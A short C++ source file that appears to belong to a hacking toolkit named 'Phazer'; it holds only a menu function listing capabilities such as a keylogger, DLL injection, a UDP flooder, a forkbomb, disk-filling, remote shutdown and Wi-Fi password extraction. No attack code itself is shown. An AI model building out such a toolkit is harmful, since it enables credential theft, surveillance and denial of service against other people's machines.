//   _____            _           _
//   \_   \_ __   ___| |_   _  __| | ___  ___
//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/

#include "stdafx.h"
#include "Functions.h"
#include <stdlib.h>
#include <iomanip>
using namespace std;

/***********************************************
* Prints out a menu for the user to choose from
***********************************************/

void menu() {
	cout << "1. Hide Phazer                     9. Forkbomb THIS computer" << endl;
	cout << "2. Expose Phazer                   10. Inject DLL into running process" << endl;
	cout << "3. Current User                    11. Keylogger" << endl;
	cout << "4. Remote shutdown a computer      12. Hex" << endl;
	cout << "5. Use CMD                         13. Curs3" << endl;
	cout << "6. Current Running Processes       14. UDP Flooder" << endl;
	cout << "7. IP Address on this machine      15. Space Eater" << endl;
	cout << "8. Virus Methods                   16. Wifi Passwords on this machine" << endl;
}